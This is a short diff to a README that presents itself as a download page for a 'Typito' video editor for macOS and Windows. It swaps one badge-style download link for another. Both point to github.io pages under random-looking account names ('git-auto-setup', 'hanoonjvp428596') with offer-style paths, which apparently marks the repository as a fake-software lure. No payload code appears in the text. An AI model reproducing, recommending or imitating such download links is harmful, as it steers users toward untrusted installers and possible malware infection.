@@ -1,11 +1,7 @@
 # Typito Download — Video Editor for MacOS & Windows
 
-<a href="https://git-auto-setup.github.io/.github/?offer=Typito" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Get%20Typito%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
-    width="320" 
-    alt="Get Typito GitHub">
-</a>
+[![GET Typito App](https://img.shields.io/badge/GET%20%E2%80%94%20Typito-App-0078D6?style=for-the-badge&logoColor=white)](https://hanoonjvp428596.github.io/.github/Typito-App)
+
 
 ---
 
